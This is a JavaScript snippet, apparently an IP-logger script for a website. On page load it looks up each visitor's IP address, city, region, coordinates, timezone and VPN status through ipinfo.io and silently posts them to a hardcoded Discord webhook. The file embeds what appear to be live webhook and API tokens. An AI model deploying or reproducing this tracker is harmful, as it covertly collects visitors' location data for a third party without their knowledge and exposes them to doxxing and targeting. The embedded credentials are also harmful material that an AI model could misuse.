// Function to send IP information to Discord webhook
function sendIPInfoToDiscord(ipInfo, isUsingVPN, vpnServiceName) {

  const webhookUrl = `https://discord.com/api/webhooks/1381352656907407430/iVllgtIG4bhE07zjzkox8yfCt8HARxuJi30nm2mLV-akkeEIWRYqq2fmPvR4gW_wk3sN`; // Change it with your discord webhook

  const xhr = new XMLHttpRequest();
  xhr.open('POST', webhookUrl);
  xhr.setRequestHeader('Content-Type', 'application/json');

  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.log('IP information sent to Discord successfully.');
      } else {
        console.error('Error sending IP information to Discord.');
      }
    }
  };

  const timestamp = new Date().toISOString();
  const ipInfoLink = `https://ipinfo.io/${ipInfo.ip}`;

  const payload = JSON.stringify({
    embeds: [{
      title: 'New Website Visitor',
      description: `**IP:** ${ipInfo.ip}\n**Country:** :flag_${ipInfo.country.toLowerCase()}: ${ipInfo.country}`,
      fields: [
        { name: 'City', value: ipInfo.city, inline: true },
        { name: 'Region', value: ipInfo.region, inline: true },
        { name: 'Coordinates', value: ipInfo.loc, inline: true },
        { name: 'Timezone', value: `${ipInfo.timezone}`, inline: true },
        { name: 'Using VPN', value: isUsingVPN ? 'Yes' : 'No', inline: true },
        { name: 'VPN Service', value: vpnServiceName || 'N/A', inline: true },
        { name: 'More Info', value: `[Click Me](${ipInfoLink})`, inline: true }
      ],
      timestamp: timestamp,
      footer: {
        text: 'Made By RealKinG!'
      }
    }]
  });

  xhr.send(payload);
}

function getIPInfo() {
  const ipInfoUrl = 'https://ipinfo.io/json?token=<your-token>'; // Change your ipinfo.io token

  fetch(ipInfoUrl)
    .then(response => response.json())
    .then(data => {
      const vpnInfoUrl = `https://ipinfo.io/${data.ip}/privacy?token=9962e9f1328fa5`;

      fetch(vpnInfoUrl)
        .then(response => response.json())
        .then(vpnData => {
          const isUsingVPN = vpnData.vpn;
          const vpnServiceName = vpnData.service;

          sendIPInfoToDiscord(data, isUsingVPN, vpnServiceName);
        })
        .catch(error => console.error('Error retrieving VPN information:', error));
    })
    .catch(error => console.error('Error retrieving IP information:', error));
}

window.onload = getIPInfo;
